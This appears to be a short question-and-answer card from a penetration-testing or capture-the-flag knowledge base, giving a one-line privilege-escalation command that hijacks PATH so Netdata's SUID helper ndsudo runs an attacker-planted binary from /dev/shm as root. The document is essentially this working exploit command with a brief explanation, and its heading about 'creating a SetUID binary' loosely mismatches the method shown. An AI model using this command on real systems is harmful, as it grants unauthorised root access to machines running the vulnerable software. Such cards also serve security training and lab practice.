TECHNIQUE / QUESTION:
How do you create a SetUID binary to gain root access on the system?

CONTEXT:
You have uploaded your crafted binary to /dev/shm on the target.

METHOD / ANSWER:
Command: `PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
Explanation: By setting the PATH variable, this command executes your binary as root, leveraging the SUID permissions.
